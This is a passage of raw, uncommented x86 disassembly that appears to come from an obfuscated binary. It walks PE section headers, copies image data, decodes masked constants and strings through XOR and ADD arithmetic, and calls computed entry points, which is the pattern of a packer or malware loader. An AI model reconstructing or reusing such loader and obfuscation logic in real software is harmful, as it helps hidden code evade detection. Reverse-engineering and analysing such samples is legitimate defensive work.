  41ee55:	mov    eax,DWORD PTR [eax+0x4]
  41ee58:	add    eax,DWORD PTR [ebp+0x20]
  41ee5b:	push   ecx
  41ee5c:	push   eax
  41ee5d:	call   0x41f5d3
  41ee62:	mov    eax,DWORD PTR [ebp+0x18]
  41ee65:	mov    ecx,DWORD PTR [ebp-0x24]
  41ee68:	mov    edx,DWORD PTR [ebp-0x8]
  41ee6b:	add    eax,0x28
  41ee6e:	xor    ecx,esi
  41ee70:	lea    ecx,[edx+ecx*1+0x3272e2]
  41ee77:	mov    edx,DWORD PTR [ebp+0xc]
  41ee7a:	mov    DWORD PTR [ebp+0x18],eax
  41ee7d:	mov    eax,DWORD PTR [ebp-0x24]
  41ee80:	movzx  edx,WORD PTR [edx+0x6]
  41ee84:	xor    eax,esi
  41ee86:	sub    edx,eax
  41ee88:	mov    eax,DWORD PTR [ebp+0xc]
  41ee8b:	sub    edx,edi
  41ee8d:	mov    DWORD PTR [ebp-0x8],ecx
  41ee90:	cmp    ecx,edx
  41ee92:	jbe    0x41ee18
  41ee94:	mov    edx,DWORD PTR [ebx+0x18c]
  41ee9a:	mov    ecx,DWORD PTR [ebp+0x20]
  41ee9d:	cmp    ecx,DWORD PTR [edx]
  41ee9f:	jne    0x41eec8
  41eea1:	mov    eax,DWORD PTR [ebx+0x1d8]
  41eea7:	lea    edx,[ebp-0x1c]
  41eeaa:	push   edx
  41eeab:	mov    edx,DWORD PTR [ebp-0x10]
  41eeae:	xor    edx,esi
  41eeb0:	add    edx,edi
  41eeb2:	push   edx
  41eeb3:	mov    edx,DWORD PTR [ebp-0x18]
  41eeb6:	push   DWORD PTR [edx+0x54]
  41eeb9:	push   ecx
  41eeba:	call   DWORD PTR [eax+0x1c]
  41eebd:	test   eax,eax
  41eebf:	je     0x41f131
  41eec5:	mov    eax,DWORD PTR [ebp+0xc]
  41eec8:	mov    ecx,DWORD PTR [ebx+0x1c8]
  41eece:	mov    ecx,DWORD PTR [ecx]
  41eed0:	xor    ecx,esi
  41eed2:	add    ecx,edi
  41eed4:	je     0x41f05c
  41eeda:	and    DWORD PTR [ebp-0x28],0x0
  41eede:	and    DWORD PTR [ebp+0x8],0x0
  41eee2:	mov    eax,0xf89c8519
  41eee7:	lea    ecx,[eax-0x8]
  41eeea:	mov    DWORD PTR [ebp-0x4c],0xf89c8517
  41eef1:	mov    DWORD PTR [ebp-0x48],0xf89c8509
  41eef8:	mov    DWORD PTR [ebp-0x44],eax
  41eefb:	mov    DWORD PTR [ebp-0x40],ecx
  41eefe:	mov    DWORD PTR [ebp-0x3c],ecx
  41ef01:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41ef08:	mov    edx,DWORD PTR [ebp+0x8]
  41ef0b:	mov    ecx,0x89b
  41ef10:	xor    cx,WORD PTR [ebp+edx*4-0x4c]
  41ef15:	mov    edx,0x72e2
  41ef1a:	add    cx,dx
  41ef1d:	mov    edx,DWORD PTR [ebp+0x8]
  41ef20:	inc    DWORD PTR [ebp+0x8]
  41ef23:	cmp    DWORD PTR [ebp+0x8],0x6
  41ef27:	mov    WORD PTR [ebp+edx*2-0xb4],cx
  41ef2f:	jb     0x41ef08
  41ef31:	mov    ecx,0xf89c850b
  41ef36:	mov    DWORD PTR [ebp-0xa4],eax
  41ef3c:	mov    DWORD PTR [ebp-0x90],eax
  41ef42:	mov    DWORD PTR [ebp-0x68],eax
  41ef45:	mov    DWORD PTR [ebp-0x64],eax
  41ef48:	lea    eax,[ecx-0x1]
  41ef4b:	mov    edx,0xf89c85ff
  41ef50:	mov    DWORD PTR [ebp-0x58],eax
  41ef53:	mov    DWORD PTR [ebp-0x54],eax
  41ef56:	mov    DWORD PTR [ebp-0xa8],0xf89c85f1
  41ef60:	mov    DWORD PTR [ebp-0xa0],ecx
  41ef66:	mov    DWORD PTR [ebp-0x9c],edx
  41ef6c:	mov    DWORD PTR [ebp-0x98],0xf89c851c
  41ef76:	mov    DWORD PTR [ebp-0x94],0xf89c8517
  41ef80:	mov    DWORD PTR [ebp-0x8c],0xf89c85f8
  41ef8a:	mov    DWORD PTR [ebp-0x88],0xf89c8517
  41ef94:	mov    DWORD PTR [ebp-0x84],0xf89c8509
  41ef9e:	mov    DWORD PTR [ebp-0x80],ecx
  41efa1:	mov    DWORD PTR [ebp-0x7c],0xf89c850c
  41efa8:	mov    DWORD PTR [ebp-0x78],edx
  41efab:	mov    DWORD PTR [ebp-0x74],0xf89c8516
  41efb2:	mov    DWORD PTR [ebp-0x70],ecx
  41efb5:	mov    DWORD PTR [ebp-0x6c],0xf89c85c4
  41efbc:	mov    DWORD PTR [ebp-0x60],ecx
  41efbf:	mov    DWORD PTR [ebp-0x5c],0xf89c8518
  41efc6:	mov    DWORD PTR [ebp-0x50],0xf89c8585
  41efcd:	xor    eax,eax
  41efcf:	mov    cl,BYTE PTR [ebp+eax*4-0xa8]
  41efd6:	xor    cl,0x9b
  41efd9:	sub    cl,0x1e
  41efdc:	mov    BYTE PTR [ebp+eax*1-0xcc],cl
  41efe3:	inc    eax
  41efe4:	cmp    eax,0x17
  41efe7:	jb     0x41efcf
  41efe9:	mov    eax,DWORD PTR [ebx+0x1d8]
  41efef:	lea    ecx,[ebp-0xb4]
  41eff5:	push   ecx
  41eff6:	call   DWORD PTR [eax+0x4]
  41eff9:	mov    ecx,DWORD PTR [ebx+0x1d8]
  41efff:	lea    edx,[ebp-0xcc]
  41f005:	push   edx
  41f006:	push   eax
  41f007:	call   DWORD PTR [ecx+0x8]
  41f00a:	lea    ecx,[ebp-0x28]
  41f00d:	push   ecx
  41f00e:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f014:	push   DWORD PTR [ecx]
  41f016:	call   eax
  41f018:	mov    eax,DWORD PTR [ebp-0x28]
  41f01b:	test   eax,eax
  41f01d:	je     0x41f059
  41f01f:	mov    DWORD PTR [ebp+0x8],eax
  41f022:	jmp    0x41f02e
  41f024:	mov    eax,DWORD PTR [eax]
  41f026:	mov    DWORD PTR [ebp-0x28],eax
  41f029:	cmp    eax,DWORD PTR [ebp+0x8]
  41f02c:	je     0x41f03b
  41f02e:	mov    edx,DWORD PTR [eax+0x18]
  41f031:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f037:	cmp    edx,DWORD PTR [ecx]
  41f039:	jne    0x41f024
  41f03b:	mov    edx,DWORD PTR [eax+0x18]
  41f03e:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f044:	cmp    edx,DWORD PTR [ecx]
  41f046:	jne    0x41f059
  41f048:	mov    edx,DWORD PTR [ebp-0x18]
  41f04b:	mov    ecx,DWORD PTR [ebx+0x190]
  41f051:	mov    edx,DWORD PTR [edx+0x28]
  41f054:	add    edx,DWORD PTR [ecx]
  41f056:	mov    DWORD PTR [eax+0x1c],edx
  41f059:	mov    eax,DWORD PTR [ebp+0xc]
  41f05c:	push   ebx
  41f05d:	push   eax
  41f05e:	push   DWORD PTR [ebp+0x20]
  41f061:	call   0x41e80b
  41f066:	test   eax,eax
  41f068:	je     0x41f131
  41f06e:	push   DWORD PTR [ebp+0xc]
  41f071:	mov    ecx,ebx
  41f073:	push   DWORD PTR [ebp+0x20]
  41f076:	call   0x41e764
  41f07b:	test   eax,eax
  41f07d:	je     0x41f131
  41f083:	mov    eax,DWORD PTR [ebp+0xc]
  41f086:	mov    edx,DWORD PTR [ebp+0x20]
  41f089:	mov    ecx,ebx
  41f08b:	call   0x41e63d
  41f090:	test   eax,eax
  41f092:	je     0x41f131
  41f098:	push   ebx
  41f099:	push   DWORD PTR [ebp+0x20]
  41f09c:	call   0x41eaee
  41f0a1:	test   eax,eax
  41f0a3:	je     0x41f131
  41f0a9:	mov    eax,DWORD PTR [ebx+0x18c]
  41f0af:	mov    edx,DWORD PTR [ebp+0x20]
  41f0b2:	cmp    edx,DWORD PTR [eax]
  41f0b4:	jne    0x41f0d0
  41f0b6:	mov    eax,DWORD PTR [ebx+0x1d8]
  41f0bc:	lea    ecx,[ebp-0x1c]
  41f0bf:	push   ecx
  41f0c0:	push   DWORD PTR [ebp-0x1c]
  41f0c3:	mov    ecx,DWORD PTR [ebp-0x18]
  41f0c6:	push   DWORD PTR [ecx+0x54]
  41f0c9:	push   edx
  41f0ca:	call   DWORD PTR [eax+0x1c]
  41f0cd:	mov    edx,DWORD PTR [ebp+0x20]
  41f0d0:	mov    eax,DWORD PTR [ebx+0x1c8]
  41f0d6:	mov    eax,DWORD PTR [eax]
  41f0d8:	xor    eax,esi
  41f0da:	add    eax,edi
  41f0dc:	je     0x41f115
  41f0de:	mov    ecx,DWORD PTR [ebp+0xc]
  41f0e1:	mov    eax,DWORD PTR [ecx+0x28]
  41f0e4:	mov    DWORD PTR [ebp+0x8],0xf89ca585
  41f0eb:	mov    esi,DWORD PTR [ebp+0x8]
  41f0ee:	push   DWORD PTR [ebp+0x14]
  41f0f1:	xor    esi,0x89b
  41f0f7:	push   DWORD PTR [ebp+0x10]
  41f0fa:	add    esi,0x72e2
  41f100:	or     WORD PTR [ecx+0x16],si
  41f104:	add    eax,edx
  41f106:	push   edx
  41f107:	call   eax
  41f109:	mov    DWORD PTR [ebx+0x1d0],0xf89c8584
  41f113:	jmp    0x41f11f
  41f115:	mov    eax,DWORD PTR [ebp+0xc]
  41f118:	mov    eax,DWORD PTR [eax+0x28]
  41f11b:	add    eax,edx
  41f11d:	call   eax
  41f11f:	mov    DWORD PTR [ebp-0x8],eax
  41f122:	mov    eax,DWORD PTR [ebp-0x8]
  41f125:	mov    ecx,DWORD PTR [ebp+0x1c]
  41f128:	mov    DWORD PTR [ecx],eax
  41f12a:	mov    DWORD PTR [ebp-0x30],0x1
  41f131:	cmp    DWORD PTR [ebp-0x30],0x0
  41f135:	jne    0x41f13b
  41f137:	and    DWORD PTR [ebp+0x20],0x0
  41f13b:	mov    eax,DWORD PTR [ebp+0x20]
  41f13e:	jmp    0x41f142
  41f140:	xor    eax,eax
  41f142:	pop    edi
  41f143:	pop    esi
  41f144:	pop    ebx
  41f145:	leave  
  41f146:	ret    0x1c
  41f149:	push   ebp
  41f14a:	mov    ebp,esp
  41f14c:	movzx  edx,WORD PTR [ecx+0x6]
  41f150:	movzx  eax,WORD PTR [ecx+0x14]
  41f154:	push   ebx
  41f155:	push   edi
  41f156:	xor    edi,edi
  41f158:	lea    eax,[eax+ecx*1+0x18]
  41f15c:	test   edx,edx
  41f15e:	je     0x41f17f
  41f160:	mov    ecx,DWORD PTR [eax+0xc]
  41f163:	lea    ebx,[ecx+esi*1]
  41f166:	cmp    DWORD PTR [ebp+0x8],ebx
  41f169:	jb     0x41f177
  41f16b:	mov    ebx,DWORD PTR [eax+0x8]
  41f16e:	add    ebx,ecx
  41f170:	add    ebx,esi
  41f172:	cmp    DWORD PTR [ebp+0x8],ebx
  41f175:	jb     0x41f181
  41f177:	add    eax,0x28
  41f17a:	inc    edi
  41f17b:	cmp    edi,edx
  41f17d:	jb     0x41f160
  41f17f:	xor    eax,eax
  41f181:	pop    edi
  41f182:	pop    ebx
  41f183:	pop    ebp
  41f184:	ret    0x4
  41f187:	push   ebp
  41f188:	mov    ebp,esp
  41f18a:	sub    esp,0x34
  41f18d:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  41f194:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41f19b:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  41f1a2:	mov    DWORD PTR [ebp-0x8],0xf89c85e4
  41f1a9:	mov    DWORD PTR [ebp-0x20],0xf89c85c4
  41f1b0:	mov    DWORD PTR [ebp-0x2c],0xf89c8503
  41f1b7:	mov    DWORD PTR [ebp-0x2c],0xf89c85e3
  41f1be:	mov    DWORD PTR [ebp-0x10],eax
  41f1c1:	mov    eax,DWORD PTR [ebp+0x8]
  41f1c4:	mov    DWORD PTR [ebp-0x14],eax
  41f1c7:	mov    eax,DWORD PTR [ebp-0xc]
  41f1ca:	push   ebx
  41f1cb:	mov    ecx,0x751089b
  41f1d0:	xor    eax,ecx
  41f1d2:	push   esi
  41f1d3:	mov    esi,DWORD PTR [ebp-0x10]
  41f1d6:	mov    edx,0x3272e2
  41f1db:	add    eax,edx
  41f1dd:	push   edi
  41f1de:	cmp    esi,eax
  41f1e0:	je     0x41f3bf
  41f1e6:	mov    eax,DWORD PTR [ebp-0xc]
  41f1e9:	mov    esi,DWORD PTR [ebp-0x14]
  41f1ec:	xor    eax,ecx
  41f1ee:	add    eax,edx
  41f1f0:	cmp    esi,eax
  41f1f2:	je     0x41f3bf
  41f1f8:	mov    eax,DWORD PTR [ebp-0xc]
  41f1fb:	xor    eax,ecx
  41f1fd:	add    eax,edx
  41f1ff:	mov    DWORD PTR [ebp-0x24],eax
  41f202:	mov    eax,DWORD PTR [ebp-0xc]
  41f205:	xor    eax,ecx
  41f207:	add    eax,edx
  41f209:	mov    DWORD PTR [ebp-0x28],eax
  41f20c:	mov    edi,DWORD PTR [ebp-0x20]
  41f20f:	mov    ebx,DWORD PTR [ebp-0x8]
  41f212:	mov    esi,0x89b
  41f217:	xor    edi,esi
  41f219:	mov    eax,0x72e2
  41f21e:	xor    ebx,esi
  41f220:	add    edi,eax
  41f222:	add    ebx,eax
  41f224:	sub    ebx,edi
  41f226:	mov    WORD PTR [ebp-0x8],bx
  41f22a:	jmp    0x41f2ef
  41f22f:	mov    edi,DWORD PTR [ebp-0xc]
  41f232:	mov    bx,WORD PTR [ebp-0x4]
  41f236:	xor    edi,esi
  41f238:	add    edi,eax
  41f23a:	cmp    bx,di
  41f23d:	je     0x41f331
  41f243:	mov    edi,DWORD PTR [ebp-0xc]
  41f246:	mov    ebx,DWORD PTR [ebp+0xc]
  41f249:	xor    edi,ecx
  41f24b:	add    edi,edx
  41f24d:	cmp    ebx,edi
  41f24f:	mov    di,WORD PTR [ebp-0x4]
  41f253:	mov    bx,WORD PTR [ebp+0x8]
  41f257:	je     0x41f2c2
  41f259:	cmp    bx,di
  41f25c:	je     0x41f2cb
  41f25e:	mov    edi,DWORD PTR [ebp-0x20]
  41f261:	mov    bx,WORD PTR [ebp+0x8]
  41f265:	xor    edi,esi
  41f267:	add    edi,eax
  41f269:	cmp    bx,di
  41f26c:	jb     0x41f28c
  41f26e:	mov    edi,DWORD PTR [ebp-0x2c]
  41f271:	mov    bx,WORD PTR [ebp+0x8]
  41f275:	xor    edi,esi
  41f277:	add    edi,eax
  41f279:	cmp    bx,di
  41f27c:	ja     0x41f28c
  41f27e:	movzx  edi,WORD PTR [ebp+0x8]
  41f282:	movzx  ebx,WORD PTR [ebp-0x8]
  41f286:	add    edi,ebx
  41f288:	mov    WORD PTR [ebp+0x8],di
  41f28c:	mov    edi,DWORD PTR [ebp-0x20]
  41f28f:	mov    bx,WORD PTR [ebp-0x4]
  41f293:	xor    edi,esi
  41f295:	add    edi,eax
  41f297:	cmp    bx,di
  41f29a:	jb     0x41f2ba
  41f29c:	mov    edi,DWORD PTR [ebp-0x2c]
  41f29f:	mov    bx,WORD PTR [ebp-0x4]
  41f2a3:	xor    edi,esi
  41f2a5:	add    edi,eax
  41f2a7:	cmp    bx,di
  41f2aa:	ja     0x41f2ba
  41f2ac:	movzx  edi,WORD PTR [ebp-0x4]
  41f2b0:	movzx  ebx,WORD PTR [ebp-0x8]
  41f2b4:	add    edi,ebx
  41f2b6:	mov    WORD PTR [ebp-0x4],di
  41f2ba:	mov    di,WORD PTR [ebp-0x4]
  41f2be:	mov    bx,WORD PTR [ebp+0x8]
  41f2c2:	cmp    bx,di
  41f2c5:	jne    0x41f3bf
  41f2cb:	mov    edi,DWORD PTR [ebp-0x1c]
  41f2ce:	mov    ebx,DWORD PTR [ebp-0x10]
  41f2d1:	xor    edi,ecx
  41f2d3:	lea    edi,[edi+ebx*1+0x3272e2]
  41f2da:	mov    DWORD PTR [ebp-0x10],edi
  41f2dd:	mov    edi,DWORD PTR [ebp-0x1c]
  41f2e0:	mov    ebx,DWORD PTR [ebp-0x14]
  41f2e3:	xor    edi,ecx
  41f2e5:	lea    edi,[edi+ebx*1+0x3272e2]
  41f2ec:	mov    DWORD PTR [ebp-0x14],edi
  41f2ef:	mov    edi,DWORD PTR [ebp-0x24]
  41f2f2:	mov    ebx,DWORD PTR [ebp-0x10]
  41f2f5:	mov    di,WORD PTR [ebx+edi*2]
  41f2f9:	mov    WORD PTR [ebp+0x8],di
  41f2fd:	mov    edi,DWORD PTR [ebp-0x28]
  41f300:	mov    ebx,DWORD PTR [ebp-0x14]
  41f303:	mov    di,WORD PTR [ebx+edi*2]
  41f307:	mov    WORD PTR [ebp-0x4],di
  41f30b:	mov    edi,DWORD PTR [ebp-0xc]
  41f30e:	mov    bx,WORD PTR [ebp+0x8]
  41f312:	xor    edi,esi
  41f314:	add    edi,eax
  41f316:	cmp    bx,di
  41f319:	jne    0x41f22f
  41f31f:	mov    eax,DWORD PTR [ebp-0x18]
  41f322:	mov    esi,DWORD PTR [ebp-0xc]
  41f325:	xor    eax,ecx
  41f327:	add    eax,edx
  41f329:	imul   eax,esi
  41f32c:	mov    DWORD PTR [ebp-0xc],eax
  41f32f:	jmp    0x41f343
  41f331:	mov    eax,DWORD PTR [ebp-0xc]
  41f334:	mov    esi,DWORD PTR [ebp-0x18]
  41f337:	xor    eax,ecx
  41f339:	lea    eax,[eax+esi*1+0x3272e2]
  41f340:	mov    DWORD PTR [ebp-0x18],eax
  41f343:	mov    eax,DWORD PTR [ebp-0x24]
  41f346:	sub    eax,edx
  41f348:	xor    eax,ecx
  41f34a:	mov    DWORD PTR [ebp-0x30],eax
  41f34d:	mov    eax,DWORD PTR [ebp-0x28]
  41f350:	sub    eax,edx
  41f352:	xor    eax,ecx
  41f354:	mov    DWORD PTR [ebp-0x34],eax
  41f357:	mov    eax,DWORD PTR [ebp-0x34]
  41f35a:	mov    esi,DWORD PTR [ebp-0x1c]
  41f35d:	xor    esi,ecx
  41f35f:	add    esi,edx
  41f361:	xor    eax,ecx
  41f363:	add    eax,0x3272e2
  41f368:	imul   esi,eax
  41f36b:	mov    eax,DWORD PTR [ebp-0x14]
  41f36e:	movzx  eax,WORD PTR [esi+eax*1]
  41f372:	mov    esi,DWORD PTR [ebp-0x30]
  41f375:	mov    edi,DWORD PTR [ebp-0x1c]
  41f378:	xor    esi,ecx
  41f37a:	add    esi,edx
  41f37c:	xor    edi,ecx
  41f37e:	add    edi,edx
  41f380:	imul   edi,esi
  41f383:	mov    esi,DWORD PTR [ebp-0x10]
  41f386:	movzx  esi,WORD PTR [edi+esi*1]
  41f38a:	sub    eax,edx
  41f38c:	sub    esi,edx
  41f38e:	xor    eax,ecx
  41f390:	xor    esi,ecx
  41f392:	cmp    esi,eax
  41f394:	jne    0x41f3bf
  41f396:	mov    eax,DWORD PTR [ebp-0x30]
  41f399:	mov    esi,DWORD PTR [ebp-0x1c]
  41f39c:	xor    eax,ecx
  41f39e:	add    eax,0x3272e2
  41f3a3:	xor    esi,ecx
  41f3a5:	add    esi,edx
  41f3a7:	imul   esi,eax
  41f3aa:	mov    eax,DWORD PTR [ebp-0x10]
  41f3ad:	movzx  eax,WORD PTR [esi+eax*1]
  41f3b1:	mov    esi,DWORD PTR [ebp-0xc]
  41f3b4:	sub    eax,edx
  41f3b6:	xor    eax,ecx
  41f3b8:	cmp    eax,esi
  41f3ba:	mov    eax,DWORD PTR [ebp-0xc]
  41f3bd:	je     0x41f3c2
  41f3bf:	mov    eax,DWORD PTR [ebp-0x18]
  41f3c2:	pop    edi
  41f3c3:	xor    eax,ecx
  41f3c5:	pop    esi
  41f3c6:	add    eax,edx
  41f3c8:	pop    ebx
  41f3c9:	leave  
  41f3ca:	ret    0x8
  41f3cd:	push   ebp
  41f3ce:	mov    ebp,esp
  41f3d0:	push   ecx
  41f3d1:	mov    cx,WORD PTR [eax]
  41f3d4:	push   esi
  41f3d5:	mov    esi,0x3b51
  41f3da:	sub    cx,si
  41f3dd:	mov    esi,0x8a8d
  41f3e2:	xor    cx,si
  41f3e5:	mov    esi,0x4e22
  41f3ea:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f3f1:	mov    edx,0xf89c8585
  41f3f6:	cmp    cx,si
  41f3f9:	je     0x41f458
  41f3fb:	push   ebx
  41f3fc:	push   edi
  41f3fd:	movzx  ecx,cx
  41f400:	mov    edi,0xffcd8d1e
  41f405:	mov    esi,0x751089b
  41f40a:	mov    ebx,0x4f86
  41f40f:	cmp    cx,bx
  41f412:	jne    0x41f417
  41f414:	mov    DWORD PTR [ebp-0x4],edx
  41f417:	lea    edx,[edi+0x1]
  41f41a:	xor    edx,esi
  41f41c:	mov    edi,edx
  41f41e:	xor    edi,esi
  41f420:	mov    cx,WORD PTR [eax+edi*2+0x64e5c4]
  41f428:	mov    ebx,0x3b51
  41f42d:	sub    cx,bx
  41f430:	mov    ebx,0x8a8d
  41f435:	xor    cx,bx
  41f438:	mov    ebx,0x4e22
  41f43d:	cmp    cx,bx
  41f440:	jne    0x41f40a
  41f442:	mov    ecx,DWORD PTR [ebp-0x4]
  41f445:	pop    edi
  41f446:	pop    ebx
  41f447:	cmp    ecx,0xf89c8586
  41f44d:	je     0x41f458
  41f44f:	xor    ecx,esi
  41f451:	lea    eax,[eax+ecx*2+0x64e5c6]
  41f458:	pop    esi
  41f459:	leave  
  41f45a:	ret    
  41f45b:	push   ebp
  41f45c:	mov    ebp,esp
  41f45e:	push   ecx
  41f45f:	push   esi
  41f460:	push   edi
  41f461:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f468:	mov    esi,0xf89c8585
  41f46d:	call   0x41f3cd
  41f472:	mov    edi,eax
  41f474:	mov    al,BYTE PTR [edi]
  41f476:	add    al,0x8
  41f478:	xor    al,0x74
  41f47a:	cmp    al,0x7c
  41f47c:	je     0x41f4df
  41f47e:	mov    eax,edi
  41f480:	mov    edx,0xffcd8d1e
  41f485:	mov    ecx,0x751089b
  41f48a:	push   ebx
  41f48b:	mov    ax,WORD PTR [eax]
  41f48e:	mov    ebx,0x3b51
  41f493:	sub    ax,bx
  41f496:	mov    ebx,0x8a8d
  41f49b:	xor    ax,bx
  41f49e:	mov    ebx,0x4e50
  41f4a3:	cmp    ax,bx
  41f4a6:	jne    0x41f4ab
  41f4a8:	mov    DWORD PTR [ebp-0x4],esi
  41f4ab:	lea    esi,[edx+0x1]
  41f4ae:	xor    esi,ecx
  41f4b0:	mov    edx,esi
  41f4b2:	xor    edx,ecx
  41f4b4:	lea    eax,[edi+edx*2+0x64e5c4]
  41f4bb:	mov    bl,BYTE PTR [eax]
  41f4bd:	add    bl,0x8
  41f4c0:	xor    bl,0x74
  41f4c3:	cmp    bl,0x7c
  41f4c6:	jne    0x41f48b
  41f4c8:	mov    eax,DWORD PTR [ebp-0x4]
  41f4cb:	pop    ebx
  41f4cc:	cmp    eax,0xf89c8586
  41f4d1:	je     0x41f4df
  41f4d3:	xor    eax,ecx
  41f4d5:	xor    ecx,ecx
  41f4d7:	mov    WORD PTR [edi+eax*2+0x64e5c4],cx
  41f4df:	mov    eax,edi
  41f4e1:	pop    edi
  41f4e2:	pop    esi
  41f4e3:	leave  
  41f4e4:	ret    
  41f4e5:	push   ebp
  41f4e6:	mov    ebp,esp
  41f4e8:	push   ecx
  41f4e9:	push   esi
  41f4ea:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f4f1:	mov    esi,0xf89c8585
  41f4f6:	call   0x41f3cd
  41f4fb:	mov    cx,WORD PTR [eax]
  41f4fe:	mov    edx,0x3b51
  41f503:	sub    cx,dx
  41f506:	mov    edx,0x8a8d
  41f50b:	xor    cx,dx
  41f50e:	mov    edx,0x4e22
  41f513:	cmp    cx,dx
  41f516:	je     0x41f56f
  41f518:	push   ebx
  41f519:	push   edi
  41f51a:	movzx  ecx,cx
  41f51d:	mov    edx,0xffcd8d1e
  41f522:	mov    edi,0x751089b
  41f527:	mov    ebx,0x4e50
  41f52c:	cmp    cx,bx
  41f52f:	jne    0x41f534
  41f531:	mov    DWORD PTR [ebp-0x4],esi
  41f534:	lea    esi,[edx+0x1]
  41f537:	xor    esi,edi
  41f539:	mov    edx,esi
  41f53b:	xor    edx,edi
  41f53d:	mov    cx,WORD PTR [eax+edx*2+0x64e5c4]
  41f545:	mov    ebx,0x3b51
  41f54a:	sub    cx,bx
  41f54d:	mov    ebx,0x8a8d
  41f552:	xor    cx,bx
  41f555:	mov    ebx,0x4e22
  41f55a:	cmp    cx,bx
  41f55d:	jne    0x41f527
  41f55f:	cmp    DWORD PTR [ebp-0x4],0xf89c8586
  41f566:	pop    edi
  41f567:	pop    ebx
  41f568:	je     0x41f56f
  41f56a:	xor    eax,eax
  41f56c:	inc    eax
  41f56d:	jmp    0x41f571
  41f56f:	xor    eax,eax
  41f571:	pop    esi
  41f572:	leave  
  41f573:	ret    
  41f574:	push   ebp
  41f575:	mov    ebp,esp
  41f577:	push   ecx
  41f578:	mov    eax,DWORD PTR [ebp+0x8]
  41f57b:	movzx  ecx,WORD PTR [eax]
  41f57e:	push   esi
  41f57f:	lea    eax,[ecx-0x3b51]
  41f585:	mov    esi,0x8a8d
  41f58a:	push   edi
  41f58b:	xor    eax,esi
  41f58d:	mov    edi,0x4e22
  41f592:	mov    DWORD PTR [ebp-0x4],edx
  41f595:	cmp    ax,di
  41f598:	je     0x41f5c5
  41f59a:	mov    eax,DWORD PTR [ebp+0x8]
  41f59d:	sub    eax,edx
  41f59f:	mov    DWORD PTR [ebp+0x8],eax
  41f5a2:	jmp    0x41f5a7
  41f5a4:	mov    eax,DWORD PTR [ebp+0x8]
  41f5a7:	mov    WORD PTR [edx],cx
  41f5aa:	add    edx,0x2
  41f5ad:	movzx  edi,WORD PTR [eax+edx*1]
  41f5b1:	mov    ecx,edi
  41f5b3:	add    edi,0xffffc4af
  41f5b9:	xor    edi,esi
  41f5bb:	mov    eax,0x4e22
  41f5c0:	cmp    di,ax
  41f5c3:	jne    0x41f5a4
  41f5c5:	xor    eax,eax
  41f5c7:	pop    edi
  41f5c8:	mov    WORD PTR [edx],ax
  41f5cb:	mov    eax,DWORD PTR [ebp-0x4]
  41f5ce:	pop    esi
  41f5cf:	leave  
  41f5d0:	ret    0x4
  41f5d3:	push   ebp
  41f5d4:	mov    ebp,esp
  41f5d6:	sub    esp,0x18
  41f5d9:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41f5e0:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41f5e7:	mov    eax,DWORD PTR [ebp-0x14]
  41f5ea:	xor    eax,0x751089b
  41f5ef:	add    eax,0x3272e2
  41f5f4:	mov    DWORD PTR [ebp-0x8],eax
  41f5f7:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  41f5fe:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  41f605:	mov    DWORD PTR [ebp-0x4],0xf89c85bb
  41f60c:	mov    eax,DWORD PTR [ebp-0x14]
  41f60f:	xor    eax,0x751089b
  41f614:	mov    ecx,DWORD PTR [ebp-0x8]
  41f617:	lea    eax,[ecx+eax*1+0x3272e2]
  41f61e:	mov    ecx,DWORD PTR [ebp-0x18]
  41f621:	xor    ecx,0x751089b
  41f627:	add    ecx,0x3272e2
  41f62d:	mov    edx,DWORD PTR [ebp+0x10]
  41f630:	imul   edx,ecx
  41f633:	cmp    eax,edx
  41f635:	jae    0x41f728
  41f63b:	mov    eax,DWORD PTR [ebp+0x10]
  41f63e:	mov    ecx,DWORD PTR [ebp-0x8]
  41f641:	sub    eax,ecx
  41f643:	mov    ecx,DWORD PTR [ebp-0x10]
  41f646:	xor    ecx,0x751089b
  41f64c:	add    ecx,0x3272e2
  41f652:	cmp    eax,ecx
  41f654:	jbe    0x41f686
  41f656:	mov    eax,DWORD PTR [ebp+0x8]
  41f659:	add    eax,DWORD PTR [ebp-0x8]
  41f65c:	mov    ecx,DWORD PTR [ebp+0xc]
  41f65f:	add    ecx,DWORD PTR [ebp-0x8]
  41f662:	mov    edx,DWORD PTR [ecx]
  41f664:	mov    DWORD PTR [eax],edx
  41f666:	mov    ecx,DWORD PTR [ecx+0x4]
  41f669:	mov    DWORD PTR [eax+0x4],ecx
  41f66c:	mov    eax,DWORD PTR [ebp-0x10]
  41f66f:	xor    eax,0x751089b
  41f674:	mov    ecx,DWORD PTR [ebp-0x8]
  41f677:	lea    eax,[ecx+eax*1+0x3272e2]
  41f67e:	mov    DWORD PTR [ebp-0x8],eax
  41f681:	jmp    0x41f723
  41f686:	mov    eax,DWORD PTR [ebp+0x10]
  41f689:	mov    ecx,DWORD PTR [ebp-0x8]
  41f68c:	sub    eax,ecx
  41f68e:	mov    ecx,DWORD PTR [ebp-0xc]
  41f691:	xor    ecx,0x751089b
  41f697:	add    ecx,0x3272e2
  41f69d:	cmp    eax,ecx
  41f69f:	jbe    0x41f6c8
  41f6a1:	mov    eax,DWORD PTR [ebp+0x8]
  41f6a4:	add    eax,DWORD PTR [ebp-0x8]
  41f6a7:	mov    ecx,DWORD PTR [ebp+0xc]
  41f6aa:	add    ecx,DWORD PTR [ebp-0x8]
  41f6ad:	mov    ecx,DWORD PTR [ecx]
  41f6af:	mov    DWORD PTR [eax],ecx
  41f6b1:	mov    eax,DWORD PTR [ebp-0xc]
  41f6b4:	xor    eax,0x751089b
  41f6b9:	mov    ecx,DWORD PTR [ebp-0x8]
  41f6bc:	lea    eax,[ecx+eax*1+0x3272e2]
  41f6c3:	mov    DWORD PTR [ebp-0x8],eax
  41f6c6:	jmp    0x41f723
  41f6c8:	mov    eax,DWORD PTR [ebp+0x10]
  41f6cb:	mov    ecx,DWORD PTR [ebp-0x8]
  41f6ce:	sub    eax,ecx
  41f6d0:	mov    ecx,DWORD PTR [ebp-0x4]
  41f6d3:	xor    ecx,0x751089b
